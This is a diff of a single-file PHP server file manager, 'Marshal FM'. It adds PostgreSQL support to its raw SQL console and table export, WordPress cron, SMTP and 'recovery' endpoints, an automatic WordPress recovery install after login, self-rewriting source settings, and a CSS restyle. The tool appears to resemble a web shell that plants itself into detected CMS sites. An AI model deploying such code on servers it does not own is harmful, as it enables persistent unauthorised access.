         if($sock)$link=@mysqli_connect('localhost',$u,$pw,$db,3306,$sock);
@@ -4186,24 +5029,44 @@ class FileManager {
         return[$link,null];
     }
     public function sqlListTables(){
-        [$h,$pt,$u,$pw,$db]=$this->sqlBuildConn();
-        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db);
+        [$h,$pt,$u,$pw,$db,$driver]=$this->sqlBuildConn();
+        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db,$driver);
         if($err)return['error'=>$err];
-        $res=mysqli_query($link,'SHOW TABLE STATUS');
         $tables=[];
-        if($res){while($row=mysqli_fetch_assoc($res))$tables[]=['name'=>$row['Name'],'rows'=>(int)($row['Rows']??0),'size'=>(int)($row['Data_length']??0)+(int)($row['Index_length']??0),'engine'=>$row['Engine']??''];}
-        $dbsRes=mysqli_query($link,'SHOW DATABASES');$dbs=[];
-        if($dbsRes){while($r=mysqli_fetch_row($dbsRes))$dbs[]=$r[0];}
-        mysqli_close($link);
+        if($link instanceof PDO){
+            try{
+                $res=$link->query("SELECT table_name,0::bigint AS table_rows,pg_total_relation_size(format('%I.%I','public',table_name)::regclass) AS table_size,'table' AS engine FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE' ORDER BY table_name");
+                foreach($res as $row)$tables[]=['name'=>$row['table_name'],'rows'=>(int)$row['table_rows'],'size'=>(int)$row['table_size'],'engine'=>$row['engine']];
+                $dbs=[];$dr=$link->query("SELECT datname FROM pg_database WHERE datallowconn=true ORDER BY datname");
+                foreach($dr as $row)$dbs[]=$row['datname'];
+            }catch(Throwable $e){return['error'=>'PostgreSQL query failed: '.$e->getMessage()];}
+        }else{
+            $res=mysqli_query($link,'SHOW TABLE STATUS');
+            if($res){while($row=mysqli_fetch_assoc($res))$tables[]=['name'=>$row['Name'],'rows'=>(int)($row['Rows']??0),'size'=>(int)($row['Data_length']??0)+(int)($row['Index_length']??0),'engine'=>$row['Engine']??''];}
+            $dbsRes=mysqli_query($link,'SHOW DATABASES');$dbs=[];
+            if($dbsRes){while($r=mysqli_fetch_row($dbsRes))$dbs[]=$r[0];}
+            mysqli_close($link);
+        }
         return['tables'=>$tables,'db'=>$db,'databases'=>$dbs];
     }
     public function sqlBrowse(){
-        [$h,$pt,$u,$pw,$db]=$this->sqlBuildConn();
+        [$h,$pt,$u,$pw,$db,$driver]=$this->sqlBuildConn();
         $table=isset($_POST['sql_table'])?trim($_POST['sql_table']):'';
         $page=max(1,(int)(isset($_POST['sql_page'])?$_POST['sql_page']:1));
         $per=50;
-        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db);
+        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db,$driver);
         if($err)return['error'=>$err];
+        if($link instanceof PDO){
+            $tE='"'.str_replace('"','""',$table).'"';
+            try{
+                $total=(int)$link->query("SELECT COUNT(*) FROM $tE")->fetchColumn();
+                $cols=[];$colRes=$link->query("SELECT column_name AS \"Field\",data_type AS \"Type\" FROM information_schema.columns WHERE table_schema='public' AND table_name=".$link->quote($table)." ORDER BY ordinal_position");
+                foreach($colRes as $r)$cols[]=['name'=>$r['Field'],'type'=>$r['Type']];
+                $rows=[];$offset=($page-1)*$per;$dr=$link->query("SELECT * FROM $tE LIMIT $per OFFSET $offset");
+                foreach($dr as $r)$rows[]=array_values($r);
+                return['columns'=>$cols,'rows'=>$rows,'total'=>$total,'page'=>$page,'perPage'=>$per,'table'=>$table,'db'=>$db,'pages'=>(int)ceil(max($total,1)/$per)];
+            }catch(Throwable $e){return['error'=>'PostgreSQL query failed: '.$e->getMessage()];}
+        }
         $tE=mysqli_real_escape_string($link,$table);
         $total=0;$cr=mysqli_query($link,"SELECT COUNT(*) AS c FROM `$tE`");
         if($cr){$rw=mysqli_fetch_assoc($cr);$total=(int)$rw['c'];}
@@ -4216,11 +5079,22 @@ class FileManager {
         return['columns'=>$cols,'rows'=>$rows,'total'=>$total,'page'=>$page,'perPage'=>$per,'table'=>$table,'db'=>$db,'pages'=>(int)ceil(max($total,1)/$per)];
     }
     public function sqlRunQuery(){
-        [$h,$pt,$u,$pw,$db]=$this->sqlBuildConn();
+        [$h,$pt,$u,$pw,$db,$driver]=$this->sqlBuildConn();
         $sql=isset($_POST['sql_query'])?trim($_POST['sql_query']):'';
         if(!$sql)return['error'=>'Empty query.'];
-        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db);
+        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db,$driver);
         if($err)return['error'=>$err];
+        if($link instanceof PDO){
+            try{
+                $res=$link->query($sql);$out=['affected'=>$res instanceof PDOStatement?0:$res,'columns'=>[],'rows'=>[],'insert_id'=>null,'error'=>null,'limited'=>false];
+                if($res instanceof PDOStatement){
+                    $out['columns']=array_map(fn($m)=>$m->getColumnMeta(0)['name']??'',array_filter(range(0,max(0,$res->columnCount()-1)),fn($i)=>true));
+                    $cnt=0;while($row=$res->fetch(PDO::FETCH_NUM)){ $out['rows'][]=$row;if(++$cnt>=500)break; }
+                    $out['limited']=$cnt>=500;
+                }else $out['affected']=$link->exec($sql);
+                return $out;
+            }catch(Throwable $e){return['affected'=>0,'columns'=>[],'rows'=>[],'insert_id'=>null,'error'=>$e->getMessage(),'limited'=>false];}
+        }
         $res=mysqli_query($link,$sql);
         $out=['affected'=>mysqli_affected_rows($link),'columns'=>[],'rows'=>[],'insert_id'=>mysqli_insert_id($link),'error'=>null,'limited'=>false];
         if($res===false){$out['error']=mysqli_error($link);}
@@ -4232,14 +5106,36 @@ class FileManager {
         mysqli_close($link);return $out;
     }
     public function sqlExport(){
-        [$h,$pt,$u,$pw,$db]=$this->sqlBuildConn();
+        [$h,$pt,$u,$pw,$db,$driver]=$this->sqlBuildConn();
         $table=isset($_POST['sql_table'])?trim($_POST['sql_table']):'';
         $fmt=isset($_POST['sql_fmt'])?$_POST['sql_fmt']:'sql';
         if(!$table){header('Content-Type: application/json');echo json_encode(['error'=>'No table specified.']);exit;}
-        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db);
+        [$link,$err]=$this->sqlConn($h,$pt,$u,$pw,$db,$driver);
         if($err){header('Content-Type: application/json');echo json_encode(['error'=>$err]);exit;}
-        $tE=mysqli_real_escape_string($link,$table);
         $safeName=preg_replace('/[^a-zA-Z0-9_\-]/','',$table);
+        if($link instanceof PDO){
+            $tE='"'.str_replace('"','""',$table).'"';
+            try{
+                $res=$link->query("SELECT * FROM $tE");
+                if($fmt==='csv'){
+                    header('Content-Type: text/csv;charset=utf-8');header('Content-Disposition: attachment; filename="'.$safeName.'.csv"');
+                    $first=true;
+                    while($row=$res->fetch(PDO::FETCH_ASSOC)){
+                        if($first){echo implode(',',array_map(fn($v)=>'"'.str_replace('"','""',(string)$v).'"',array_keys($row)))."\r\n";$first=false;}
+                        echo implode(',',array_map(fn($v)=>$v===null?'':'"'.str_replace('"','""',(string)$v).'"',array_values($row)))."\r\n";
+                    }
+                }else{
+                    header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.$safeName.'.sql"');
+                    echo "-- SQL Export: `$table` from `$db`\n-- Generated: ".date('Y-m-d H:i:s')."\n\n";
+                    while($row=$res->fetch(PDO::FETCH_NUM)){
+                        $vals=implode(',',array_map(fn($v)=>$v===null?'NULL':$link->quote((string)$v),$row));
+                        echo "INSERT INTO ".$tE." VALUES ($vals);\n";
+                    }
+                }
+            }catch(Throwable $e){header('Content-Type: application/json');echo json_encode(['error'=>$e->getMessage()]);}
+            exit;
+        }
+        $tE=mysqli_real_escape_string($link,$table);
         if($fmt==='csv'){
             header('Content-Type: text/csv;charset=utf-8');
             header('Content-Disposition: attachment; filename="'.$safeName.'.csv"');
@@ -4272,6 +5168,10 @@ class FileManager {
     }
 }
 $fm=new FileManager();
+/* Automatically provision the default detected WordPress recovery after a
+   successful File Manager login. This is intentionally authenticated-only:
+   a public login-page request must never mutate an arbitrary CMS. */
+if(!empty($_SESSION['fm_admin']))$fm->wpAutomationAutoBootstrap();
 
 /* ── API ── */
 if(isset($_GET['x'])){
@@ -4372,6 +5272,10 @@ if(isset($_GET['x'])){
         $dir=isset($_GET['dir'])?realpath($_GET['dir']):$fm->getCwd();
         echo json_encode($dir?$fm->cmsDetect($dir):['type'=>null]);exit;
     }
+    if($xop==='cms_quick_info'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        echo json_encode($fm->cmsQuickInfo($fm->getCwd()));exit;
+    }
     if($xop==='cmsscan'){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
         echo json_encode($fm->cmsScan());exit;
@@ -4404,6 +5308,44 @@ if(isset($_GET['x'])){
     if($xop==='cms_maintenance_status'){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
         echo json_encode($fm->cmsMaintenanceStatus($cfgB64()));exit;
+    }
+    if($xop==='wp_automation'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        echo json_encode($fm->wpAutomationData($cfgB64()));exit;
+    }
+    if($xop==='wp_smtp_save'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
+        echo json_encode($fm->wpAutomationSaveSmtp($cfgB64()));exit;
+    }
+    if($xop==='wp_cron_delete'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
+        echo json_encode($fm->wpAutomationDeleteCron($cfgB64()));exit;
+    }
+    if($xop==='wp_cron_run'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
+        echo json_encode($fm->wpAutomationRunCron($cfgB64()));exit;
+    }
+    if($xop==='wp_cron_email'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
+        echo json_encode($fm->wpAutomationScheduleEmail($cfgB64()));exit;
+    }
+    if($xop==='wp_recovery_status'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        echo json_encode($fm->wpAutomationRecoveryStatus($cfgB64()));exit;
+    }
+    if($xop==='wp_recovery_install'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
+        echo json_encode($fm->wpAutomationInstallRecovery($cfgB64()));exit;
+    }
+    if($xop==='wp_recovery_remove'){
+        if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
+        if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
+        echo json_encode($fm->wpAutomationRemoveRecovery($cfgB64()));exit;
     }
     if($xop==='tags'){
         $dir=isset($_GET['dir'])?realpath($_GET['dir']):$fm->getCwd();
@@ -4498,9 +5440,9 @@ if(isset($_GET['x'])){
         if(empty($_SESSION['fm_admin'])){echo json_encode(['error'=>'Admins only.']);exit;}
         if(!isset($_POST['csrf_token'])||$_POST['csrf_token']!==$_SESSION['csrf_token']){echo json_encode(['error'=>'Security error.']);exit;}
         $pause=!isset($_POST['paused'])||$_POST['paused']!=='0';
-        $p=fg_get_update_pause_path();
-        if($pause){@mkdir(dirname($p),0700,true);$ok=@file_put_contents($p,(string)time())!==false;}
-        else{$ok=!is_file($p)||@unlink($p);}
+        // Persist this setting in the current file's own PHP source, not in a
+        // sidecar flag file. The rewrite is atomic and syntax-checked.
+        $ok=fm_guardian_rewrite_constant('FM_UPDATE_PAUSED',$pause,true);
         if($fm)$fm->log('guardian_settings','auto-update '.($pause?'paused':'resumed'));
         echo json_encode(['ok'=>$ok,'paused'=>fm_guardian_update_paused()]);exit;
     }
@@ -4668,9 +5610,11 @@ $totalSize=0;foreach($list['files']as $f)$totalSize+=$f['size'];
 $diskTotal=$fm->diskTotal();$diskFree=$fm->diskFree();$diskUsed=$diskTotal-$diskFree;$diskPct=$diskTotal>0?round(($diskUsed/$diskTotal)*100):0;
 $curSort=isset($_GET['sort'])?$_GET['sort']:'name';$curDir_=isset($_GET['sdir'])?$_GET['sdir']:'asc';
 $curHidden=isset($_GET['hidden'])&&$_GET['hidden']==='1';$curTF=isset($_GET['tf'])?$_GET['tf']:'';
+$terminalStandalone=isset($_GET['terminal'])&&$_GET['terminal']==='1';
+if($terminalStandalone)fm_ensure_terminal_font();
 function sortUrl($col){global $curSort,$curDir_;$d=($curSort===$col&&$curDir_==='asc')?'desc':'asc';$q=$_GET;$q['sort']=$col;$q['sdir']=$d;return '?'.http_build_query($q);}
 
-function svgFolder(){return '<svg class="ti" viewBox="0 0 24 24" fill="none" stroke="#818cf8" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="rgba(129,140,248,.15)"/></svg>';}
+function svgFolder(){return '<svg class="ti" viewBox="0 0 24 24" fill="none" stroke="#85898C" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" fill="rgba(133,137,140,.15)"/></svg>';}
 function svgFile($t='file'){global $fm;$color=$fm->getColor($t);$p=['image'=>'<rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/>','video'=>'<rect x="2" y="5" width="14" height="14" rx="2"/><path d="M16 10l6-4v12l-6-4z"/>','audio'=>'<path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/>','archive'=>'<rect x="3" y="3" width="18" height="18" rx="2"/><path d="M8 3v18M14 8h2M14 12h2M14 16h2"/>','pdf'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><text x="12" y="18" font-size="6" text-anchor="middle" fill="currentColor" stroke="none" font-weight="700">PDF</text>','word'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="16" y2="17"/>','excel'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><path d="M9.5 13l5 6M14.5 13l-5 6"/>','code'=>'<polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/>','data'=>'<ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/>','text'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/><line x1="8" y1="13" x2="16" y2="13"/><line x1="8" y1="17" x2="13" y2="17"/>','config'=>'<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82V9a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.6V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9z"/>','file'=>'<path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/>'];$inner=isset($p[$t])?$p[$t]:$p['file'];return '<svg class="ti" viewBox="0 0 24 24" fill="none" stroke="'.$color.'" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">'.$inner.'</svg>';}
 ?>
 <!DOCTYPE html>
@@ -4679,29 +5623,31 @@ function svgFile($t='file'){global $fm;$color=$fm->getColor($t);$p=['image'=>'<r
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
 <title>Marshal FM</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
 /* ══ RESET & TOKENS ══ */
+@font-face{font-family:'TerminalTMT';src:url('attached_assets/fonts/tmt.ttf') format('truetype'),url('https://github.com/orgezeo/marshal-file-manager/raw/refs/heads/main/fonts/terminal/tmt.ttf') format('truetype');font-weight:100 900;font-style:normal;font-display:block}
 *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
 :root{
-  --bg:#09090b;--panel:#0d0d10;--surf:#111115;--raised:#18181c;--hov:#1c1c21;--act:#222228;
-  --border:rgba(255,255,255,.065);--border2:rgba(255,255,255,.12);
-  --t1:#f4f4f5;--t2:#71717a;--t3:#3f3f46;--link:#818cf8;
-  --indigo:#6366f1;--indigo2:#4f46e5;
+   --bg:#101010;--panel:#151515;--surf:#191919;--raised:#202020;--hov:#272727;--act:#2F2F2F;
+   --border:rgba(125,129,132,.17);--border2:rgba(125,129,132,.29);
+   --t1:#C9C6C2;--t2:#929495;--t3:#777A7C;--link:#C9C6C2;
+  --indigo:#C9C6C2;--indigo2:#454744;--check:#3F4140;--check-border:#74787A;
   --green:#22c55e;--amber:#f59e0b;--red:#ef4444;--blue:#3b82f6;--pink:#ec4899;--purple:#8b5cf6;
   --sw:240px;--th:52px;--bh:26px;
   --r:10px;--rlg:14px;--rxl:18px;
-  --spring:cubic-bezier(.34,1.56,.64,1);--out:cubic-bezier(.25,.46,.45,.94);
-   --field:rgba(0,0,0,.4);--fieldb:rgba(255,255,255,.15);--fieldb-h:rgba(255,255,255,.35);--fieldh:rgba(255,255,255,.05);
+   --spring:cubic-bezier(.34,1.56,.64,1);--out:cubic-bezier(.25,.46,.45,.94);
+   --fw-regular:400;--fw-medium:600;--fw-strong:700;--fw-muted:300;
+  --field:rgba(0,0,0,.58);--fieldb:rgba(125,129,132,.18);--fieldb-h:rgba(125,129,132,.34);--fieldh:rgba(125,129,132,.045);
 }
 :root[data-theme="light"]{
-  --bg:#f4f4f6;--panel:#ffffff;--surf:#ffffff;--raised:#f1f1f4;--hov:#eaeaef;--act:#e2e2e9;
-  --border:rgba(0,0,0,.08);--border2:rgba(0,0,0,.14);
-  --t1:#18181b;--t2:#52525b;--t3:#a1a1aa;--link:#4f46e5;
-  --field:rgba(0,0,0,.035);--fieldb:rgba(0,0,0,.16);--fieldb-h:rgba(0,0,0,.32);--fieldh:rgba(0,0,0,.04);
+  --bg:#f1f1f1;--panel:#ffffff;--surf:#ffffff;--raised:#e5e5e5;--hov:#dcdcdc;--act:#d2d2d2;
+  --border:rgba(99,100,95,.2);--border2:rgba(99,100,95,.35);
+  --t1:#181818;--t2:#63645F;--t3:#85898C;--link:#63645F;
+  --field:rgba(0,0,0,.035);--fieldb:rgba(0,0,0,.16);--fieldb-h:rgba(0,0,0,.32);--fieldh:rgba(0,0,0,.04);--check:#5F625E;--check-border:#85898C;
 }
 html{height:100%;-webkit-tap-highlight-color:transparent}
-body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t1);font-size:13.5px;line-height:1.5;height:100vh;overflow:hidden;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;transition:background-color .2s var(--out),color .2s var(--out)}
+body{font-family:'Inter',ui-sans-serif,system-ui,-apple-system,'Segoe UI',sans-serif;font-weight:var(--fw-regular);background:var(--bg);color:var(--t1);font-size:13.5px;line-height:1.5;height:100vh;overflow:hidden;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale;transition:background-color .2s var(--out),color .2s var(--out)}
 
 /* ══ LAYOUT ══ */
 .shell{display:grid;grid-template:"tb tb" var(--th) "sb main" 1fr "bar bar" var(--bh) / var(--sw) 1fr;height:100vh;overflow:hidden}
@@ -4709,10 +5655,10 @@ body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t
 /* ══ TOPBAR ══ */
 .topbar{grid-area:tb;background:var(--panel);border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 10px;gap:6px;z-index:200;min-width:0}
 .brand{display:flex;align-items:center;gap:8px;width:var(--sw);flex-shrink:0;text-decoration:none;padding-right:4px;min-width:0}
-.brand-icon{width:28px;height:28px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:transform .25s var(--spring)}
+ .brand-icon{width:32px;height:32px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:transform .25s var(--spring)}
 .brand-icon:hover{transform:scale(1.12)}
- .brand-icon img{width:24px;height:24px;object-fit:contain}
-.brand-name{font-size:13px;font-weight:700;color:var(--t1);letter-spacing:-.2px;white-space:nowrap}
+ .brand-icon img{width:32px;height:32px;object-fit:contain}
+.brand-name{font-size:13px;font-weight:var(--fw-strong);color:var(--t1);letter-spacing:-.2px;white-space:nowrap}
 .dv{width:1px;height:18px;background:var(--border);flex-shrink:0}
 .bc{display:flex;align-items:center;flex:1;overflow:hidden;min-width:0}
 .bc-crumb{display:flex;align-items:center;animation:fadeSlide .3s var(--spring) both}
@@ -4721,9 +5667,13 @@ body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t
 .bc a{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--t2);text-decoration:none;padding:3px 6px;border-radius:6px;transition:background .15s,color .15s;white-space:nowrap;max-width:120px;overflow:hidden;text-overflow:ellipsis;display:inline-block}
 .bc a:hover{background:var(--hov);color:var(--link)}.bc a.last{color:var(--t1);font-weight:600}
 .bc-sep{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--t3);padding:0 1px;user-select:none}
-.tb-right{display:flex;align-items:center;gap:4px;margin-left:auto;flex-shrink:0}
-.tsearch{display:flex;align-items:center;gap:6px;background:var(--field);border:1px solid var(--border);border-radius:var(--r);padding:0 4px 0 10px;transition:border-color .18s}
-.tsearch:focus-within{border-color:rgba(99,102,241,.5)}
+.tb-right{display:flex;align-items:center;gap:6px;margin-left:auto;flex-shrink:0}
+.tb-right .btn{height:32px;justify-content:center}
+.tb-right .btn-icon{width:32px;min-width:32px;padding:0}
+.tb-right .btn-sm{min-width:32px;padding:0 10px}
+.tb-right .btn svg{flex-shrink:0}
+.tsearch{height:32px;display:flex;align-items:center;gap:6px;background:var(--field);border:1px solid var(--border);border-radius:var(--r);padding:0 4px 0 10px;transition:border-color .18s}
+.tsearch:focus-within{border-color:rgba(133,137,140,.55)}
 .tsearch svg{width:13px;height:13px;stroke:var(--t3);fill:none;stroke-width:2;stroke-linecap:round;flex-shrink:0}
 .tsearch input{background:transparent;border:none;outline:none;color:var(--t1);font-size:12px;padding:6px 4px;width:150px}
 .tsearch input::placeholder{color:var(--t3)}
@@ -4733,7 +5683,7 @@ body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t
 .sb-sec{padding:14px 10px 0}
 .sb-label{font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.9px;color:var(--t3);padding:4px 10px 7px;display:flex;align-items:center;justify-content:space-between}
 .sb-nav{display:flex;flex-direction:column;gap:3px}
-.sb-item{display:flex;align-items:center;gap:10px;padding:8px 11px;border-radius:var(--r);color:var(--t2);text-decoration:none;font-size:12.5px;font-weight:500;transition:background .15s,color .15s,transform .18s var(--spring);cursor:pointer;border:none;background:transparent;width:100%;text-align:left;white-space:nowrap;overflow:hidden;min-height:34px}
+.sb-item{display:flex;align-items:center;gap:10px;padding:8px 11px;border-radius:var(--r);color:var(--t2);text-decoration:none;font-size:12.5px;font-weight:var(--fw-medium);transition:background .15s,color .15s,transform .18s var(--spring);cursor:pointer;border:none;background:transparent;width:100%;text-align:left;white-space:nowrap;overflow:hidden;min-height:34px}
 .sb-item svg{width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0;transition:transform .18s var(--spring)}
 .sb-item:hover{background:var(--hov);color:var(--t1);transform:translateX(2px)}.sb-item:hover svg{transform:scale(1.1)}.sb-item:active{transform:scale(.97)}
 .sb-item.danger:hover{background:rgba(239,68,68,.08);color:#fca5a5}
@@ -4744,7 +5694,7 @@ body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t
 .sb-flink svg{width:14px;height:14px;flex-shrink:0;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round}
 .sb-flink span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex:1}
 .sb-flink:hover{background:var(--hov);color:var(--t1);transform:translateX(2px)}.sb-flink:active{transform:scale(.97)}
-.sb-empty{font-size:11.5px;color:var(--t3);padding:8px 10px;font-style:italic}
+.sb-empty{font-size:11.5px;font-weight:var(--fw-muted);color:var(--t3);padding:8px 10px;font-style:italic}
 .sb-fav-row{display:flex;align-items:center;gap:2px}
 .sb-fav-del{background:none;border:none;color:var(--t3);cursor:pointer;padding:4px;border-radius:6px;display:flex;flex-shrink:0;transition:color .15s,background .15s}
 .sb-fav-del:hover{color:#fca5a5;background:rgba(239,68,68,.1)}.sb-fav-del svg{width:11px;height:11px;stroke:currentColor;fill:none;stroke-width:2}
@@ -4757,10 +5707,14 @@ body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t
 
 /* ══ MAIN ══ */
 .main{grid-area:main;display:flex;flex-direction:column;overflow:hidden;min-width:0;position:relative}
-.toolbar{padding:8px 12px;border-bottom:1px solid var(--border);background:var(--panel);display:flex;flex-wrap:wrap;gap:6px;align-items:center;flex-shrink:0}
+.toolbar{padding:10px 12px;border-bottom:1px solid var(--border);background:var(--panel);display:flex;flex-direction:column;flex-wrap:nowrap;gap:8px;align-items:stretch;flex-shrink:0}
+.toolbar .tb-row{display:flex;align-items:center;flex-wrap:nowrap!important;gap:8px;width:100%;min-width:0}
+.toolbar .tb-row .inp{height:32px;padding-top:0;padding-bottom:0}
+.toolbar .tb-row .btn-sm,.toolbar .tb-row .upl-lbl{height:29px;justify-content:center;padding-top:0;padding-bottom:0}
+.toolbar .tb-row .btn-sm{flex-shrink:0}
 .content{flex:1;overflow-y:auto;padding:12px;position:relative}
 .content::-webkit-scrollbar{width:4px}.content::-webkit-scrollbar-thumb{background:rgba(255,255,255,.07);border-radius:6px}
-.content.drag-over::after{content:'Drop files to upload';position:absolute;inset:8px;border:2px dashed var(--indigo);border-radius:var(--rlg);background:rgba(99,102,241,.07);display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:600;color:var(--link);pointer-events:none;z-index:50}
+.content.drag-over::after{content:'Drop files to upload';position:absolute;inset:8px;border:2px dashed var(--indigo);border-radius:var(--rlg);background:rgba(133,137,140,.07);display:flex;align-items:center;justify-content:center;font-size:16px;font-weight:600;color:var(--link);pointer-events:none;z-index:50}
 
 /* ══ ALERTS ══ */
 .alerts{display:flex;flex-direction:column;gap:6px;margin-bottom:10px}
@@ -4783,8 +5737,8 @@ body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--t
 .ft th a:hover{color:var(--t2)}.sa a{color:var(--link)!important}.sa .arr{color:var(--link)}
 .arr{opacity:.5;font-size:9px}
 .ft tbody tr{border-bottom:1px solid var(--border);transition:background .12s;animation:rIn .25s var(--spring) both}
-.ft tbody tr:last-child{border-bottom:none}.ft tbody tr:hover{background:var(--hov)}.ft tbody tr.selected{background:rgba(99,102,241,.09)}
-.ft tbody tr:focus{outline:2px solid rgba(99,102,241,.5);outline-offset:-2px}
+.ft tbody tr:last-child{border-bottom:none}.ft tbody tr:hover{background:var(--hov)}.ft tbody tr.selected{background:rgba(133,137,140,.09)}
+.ft tbody tr:focus{outline:2px solid rgba(133,137,140,.5);outline-offset:-2px}
 <?php for($i=1;$i<=60;$i++) echo ".ft tbody tr:nth-child($i){animation-delay:".($i*.018)."s}\n";?>
 @keyframes rIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
 .ft td{padding:6px 10px;vertical-align:middle}
@@ -4802,19 +5756,19 @@ input[type=checkbox],input[type=radio]{
 }
 input[type=radio]{border-radius:50%}
